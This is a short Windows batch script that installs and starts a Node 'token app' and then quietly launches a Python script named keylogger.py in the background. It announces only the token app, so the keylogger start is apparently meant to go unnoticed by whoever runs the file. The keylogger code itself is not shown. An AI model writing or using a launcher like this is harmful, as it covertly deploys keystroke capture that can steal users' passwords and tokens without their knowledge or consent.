cd %~dp0tokenApp
CALL npm install
echo Starting token app.
START "Token App" /D %~dp0tokenApp /B npm start
cd %~dp0
START "Keylogger" /D %~dp0 /B python keylogger.py